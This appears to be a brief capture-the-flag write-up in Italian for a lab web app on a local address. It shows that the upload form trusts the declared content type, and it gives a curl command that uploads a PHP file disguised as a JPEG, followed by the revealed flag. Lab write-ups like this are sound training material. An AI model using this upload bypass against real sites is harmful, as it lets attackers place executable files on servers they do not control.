# Upload
All'indirizzo `http://192.168.56.134/?page=upload` l'unico controllo che viene
fatto è sul tipo dichiarato nel caricamento del file e non sull'effettivo file.
Quindi basta una semplice richiesta con `curl` per poter caricare qualsiasi tipo
di file e ricevere così la flag:
```
curl \
-X POST \
-H 'Content-Type: multipart/form-data' \
-F 'uploaded=@file.php;type=image/jpeg' \
-F 'Upload=Upload' \
'http://192.168.56.134/?page=upload' \
| grep flag
```
```
The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```